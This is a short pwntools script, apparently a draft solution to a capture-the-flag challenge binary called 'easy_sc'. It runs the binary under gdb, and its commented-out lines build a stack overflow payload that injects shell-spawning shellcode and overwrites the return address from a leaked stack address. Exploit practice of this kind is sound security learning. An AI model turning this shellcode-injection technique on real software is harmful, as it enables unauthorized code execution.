from pwn import *
# p=process('./easy_sc')
context.arch='amd64'
# context.terminal=['tmux','-x','sh','-c']
p=gdb.debug('./easy_sc')
# r=p.recv()
# print(r)
# num=int(r.split(b'0x')[1][:-1],base=16)
# info('rbp:0x%X'%num)
# sc=asm(shellcraft.sh())
# payload=sc.ljust(0x110,b'\x00')+p64(0)+p64(num+4-0x110)
# p.send(payload)
p.interactive()